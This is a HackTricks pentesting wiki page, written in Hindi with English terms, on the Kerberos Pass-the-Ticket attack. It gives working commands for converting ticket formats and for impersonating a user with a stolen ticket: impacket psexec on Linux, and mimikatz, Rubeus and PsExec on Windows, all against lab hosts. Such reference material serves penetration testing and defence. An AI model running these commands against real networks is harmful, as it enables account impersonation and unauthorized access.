# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

**Pass The Ticket (PTT)** attack method में attackers, user के password या hash values के बजाय उसकी **authentication ticket चुरा लेते हैं**। इसके बाद इस चोरी की गई ticket का उपयोग **user का रूप धारण करने** और network के भीतर resources तथा services तक unauthorized access प्राप्त करने के लिए किया जाता है।<sup>[[1]](#references)</sup>

**पढ़ें**:

- [Windows से tickets harvest करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux से tickets harvest करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Linux और Windows tickets को platforms के बीच swap करना**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) tool केवल ticket और एक output file का उपयोग करके ticket formats को convert करता है।
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windows में [Kekeo](https://github.com/gentilkiwi/kekeo) का उपयोग किया जा सकता है।

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## References

- [1] [Kerberos (II): Kerberos पर attack कैसे करें?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
